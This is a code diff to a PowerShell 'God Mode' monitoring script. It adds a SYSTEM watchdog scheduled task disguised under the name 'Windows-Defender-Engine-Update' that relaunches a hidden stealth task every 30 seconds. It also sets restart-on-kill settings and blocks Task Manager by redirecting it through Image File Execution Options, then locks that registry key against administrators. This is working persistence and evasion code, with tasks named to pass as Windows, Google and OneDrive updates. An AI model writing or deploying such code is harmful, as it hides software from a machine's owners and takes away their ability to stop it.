@@ -127,6 +127,7 @@ $GodModeInstallScript  = Join-Path -Path $GodModeInstallDir -ChildPath "GodMode.
 $GodModeCmdPath        = "C:\Windows\godmode.cmd"
 $GodModeTaskName       = "Windows-Update-Health-Monitor"
 $GodModeGuardianName   = "Windows-Update-Health-Check"
+$GodModeWatchdogName   = "Windows-Defender-Engine-Update"
 
 # Raw debug dump rotation settings
 $RawDumpDir = Join-Path $env:TEMP "GodMode_RawDumps"
@@ -3441,8 +3442,11 @@ function Register-StealthTask {
     $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
         -LogonType ServiceAccount -RunLevel Highest
 
+    # Aggressive restart settings: auto-relaunch as SYSTEM if killed
+    $settings = New-ScheduledTaskSettingsSet -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable:$false
+
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
-        -Principal $principal -Force | Out-Null
+        -Principal $principal -Settings $settings -Force | Out-Null
 
     # Start the task immediately so monitoring begins now
     try {
@@ -3453,6 +3457,112 @@ function Register-StealthTask {
 function Unregister-StealthTask {
     Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
         Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+}
+
+function Register-SystemWatchdog {
+    Write-DebugLog -FunctionName "Register-SystemWatchdog" -Action "ENTRY"
+
+    # Create a watchdog script file that checks if the stealth task is running and relaunches it
+    $WatchdogScriptPath = Join-Path $GodModeInstallDir "watchdog.ps1"
+    $WatchdogContent = @'
+# God Mode SYSTEM Watchdog
+$task = Get-ScheduledTask -TaskName '__PREFIX__*' -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Running' }
+if (-not $task) {
+    $stealth = Get-ScheduledTask -TaskName '__PREFIX__*' -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($stealth) {
+        Start-ScheduledTask -TaskName $stealth.TaskName -ErrorAction SilentlyContinue
+    } else {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"__SCRIPT__`" -Launch"
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
+        $taskName = "__PREFIX__" + (Get-Random -Minimum 10000 -Maximum 99999)
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
+        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+    }
+}
+'@
+    $WatchdogContent = $WatchdogContent.Replace('__PREFIX__', $GodModeTaskPrefix)
+    $WatchdogContent = $WatchdogContent.Replace('__SCRIPT__', $GodModeInstallScript)
+    Set-Content -Path $WatchdogScriptPath -Value $WatchdogContent -Encoding ASCII -Force
+
+    # Create the watchdog scheduled task (30-second heartbeat, runs as SYSTEM, auto-restarts if killed)
+    $WatchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$WatchdogScriptPath`""
+    $WatchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 30) -RepetitionDuration (New-TimeSpan -Days 9999)
+    $WatchdogPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
+    $WatchdogSettings = New-ScheduledTaskSettingsSet -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable:$false
+
+    Register-ScheduledTask -TaskName $GodModeWatchdogName -Action $WatchdogAction -Trigger $WatchdogTrigger -Principal $WatchdogPrincipal -Settings $WatchdogSettings -Force -ErrorAction SilentlyContinue | Out-Null
+    Write-Log -Message "SYSTEM watchdog registered (30-second heartbeat, auto-restart on kill)." -Type "INFO" -Color Gray
+    Write-DebugLog -FunctionName "Register-SystemWatchdog" -Action "EXIT" -Message "Success"
+}
+
+function Unregister-SystemWatchdog {
+    Write-DebugLog -FunctionName "Unregister-SystemWatchdog" -Action "ENTRY"
+    if (Get-ScheduledTask -TaskName $GodModeWatchdogName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $GodModeWatchdogName -Confirm:$false -ErrorAction SilentlyContinue
+    }
+    $WatchdogScriptPath = Join-Path $GodModeInstallDir "watchdog.ps1"
+    if (Test-Path $WatchdogScriptPath) { Remove-Item -Path $WatchdogScriptPath -Force -ErrorAction SilentlyContinue }
+    Write-Log -Message "SYSTEM watchdog removed." -Type "INFO" -Color Gray
+    Write-DebugLog -FunctionName "Unregister-SystemWatchdog" -Action "EXIT" -Message "Success"
+}
+
+function Block-TaskManager {
+    Write-DebugLog -FunctionName "Block-TaskManager" -Action "ENTRY"
+    try {
+        $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
+        if (-not (Test-Path $IfeoPath)) { New-Item -Path $IfeoPath -Force | Out-Null }
+        # Redirect taskmgr to a non-existent executable so it silently fails to launch
+        Set-ItemProperty -Path $IfeoPath -Name "Debugger" -Value "C:\Windows\System32\notaskmgr.exe" -Force -ErrorAction SilentlyContinue
+
+        # Also set the classic DisableTaskMgr policy
+        $PolicyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        if (-not (Test-Path $PolicyPath)) { New-Item -Path $PolicyPath -Force | Out-Null }
+        Set-ItemProperty -Path $PolicyPath -Name "DisableTaskMgr" -Value 1 -Force -ErrorAction SilentlyContinue
+
+        # Harden the IFEO registry key against tampering
+        $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+        if ($RegKey) {
+            $Acl = $RegKey.GetAccessControl()
+            $Acl.SetAccessRuleProtection($true, $false)
+            $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
+            $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
+            $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "ReadKey", "ContainerInherit,ObjectInherit", "None", "Allow")))
+            $RegKey.SetAccessControl($Acl)
+            $RegKey.Close()
+        }
+        Write-Log -Message "Task Manager blocked via IFEO and policy." -Type "INFO" -Color Gray
+    } catch {
+        Write-Log -Message "Task Manager block failed: $_" -Type "WARN" -Color Yellow
+    }
+    Write-DebugLog -FunctionName "Block-TaskManager" -Action "EXIT" -Message "Complete"
+}
+
+function Unblock-TaskManager {
+    Write-DebugLog -FunctionName "Unblock-TaskManager" -Action "ENTRY"
+    try {
+        $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
+        if (Test-Path $IfeoPath) {
+            Remove-ItemProperty -Path $IfeoPath -Name "Debugger" -ErrorAction SilentlyContinue
+            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+            if ($RegKey) {
+                $Acl = $RegKey.GetAccessControl()
+                $Acl.SetAccessRuleProtection($false, $false)
+                $RegKey.SetAccessControl($Acl)
+                $RegKey.Close()
+            }
+            Remove-Item -Path $IfeoPath -Force -ErrorAction SilentlyContinue
+        }
+        $PolicyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        if (Test-Path $PolicyPath) {
+            Remove-ItemProperty -Path $PolicyPath -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
+        }
+        Write-Log -Message "Task Manager unblocked." -Type "INFO" -Color Gray
+    } catch {
+        Write-Log -Message "Task Manager unblock failed: $_" -Type "WARN" -Color Yellow
+    }
+    Write-DebugLog -FunctionName "Unblock-TaskManager" -Action "EXIT" -Message "Complete"
 }
 
 function Elevate-Process {
@@ -4198,6 +4308,12 @@ function Enable-GodMode {
     # --- Stealth mode: harder to detect ---
     Invoke-StealthMode
 
+    # --- SYSTEM watchdog: relaunch as SYSTEM if monitoring is killed ---
+    Register-SystemWatchdog
+
+    # --- Block Task Manager to prevent manual process termination ---
+    Block-TaskManager
+
     Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
     Write-DebugLog -FunctionName "Enable-GodMode" -Action "EXIT" -Message "Success"
 }
@@ -4206,6 +4322,8 @@ function Disable-GodMode {
     Write-DebugLog -FunctionName "Disable-GodMode" -Action "ENTRY"
     Remove-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
     Unregister-StealthTask
+    Unregister-SystemWatchdog
+    Unblock-TaskManager
 
     # --- Remove backup task prefixes ---
     $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
@@ -4308,6 +4426,30 @@ function Show-GodModeStatus {
         Write-Host "  Stealth Task            : INSTALLED ($($StealthTasks.Count) found)" -ForegroundColor Cyan
     } else {
         Write-Host "  Stealth Task            : NOT INSTALLED" -ForegroundColor DarkGray
+    }
+
+    # Watchdog status
+    $Watchdog = Get-ScheduledTask -TaskName $GodModeWatchdogName -ErrorAction SilentlyContinue
+    if ($Watchdog) {
+        Write-Host "  Watchdog                : INSTALLED ($($Watchdog.State))" -ForegroundColor Cyan
+    } else {
+        Write-Host "  Watchdog                : NOT INSTALLED" -ForegroundColor DarkGray
+    }
+
+    # Task Manager block status
+    $TaskMgrBlocked = $false
+    $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
+    if (Test-Path $IfeoPath) {
+        $Debugger = (Get-ItemProperty -Path $IfeoPath -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
+        if ($Debugger) { $TaskMgrBlocked = $true }
+    }
+    $PolicyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+    $DisableTaskMgr = (Get-ItemProperty -Path $PolicyPath -Name "DisableTaskMgr" -ErrorAction SilentlyContinue).DisableTaskMgr
+    if ($DisableTaskMgr -eq 1) { $TaskMgrBlocked = $true }
+    if ($TaskMgrBlocked) {
+        Write-Host "  Task Manager            : BLOCKED" -ForegroundColor Red
+    } else {
+        Write-Host "  Task Manager            : UNBLOCKED" -ForegroundColor Green
     }
 
     # Defender processes
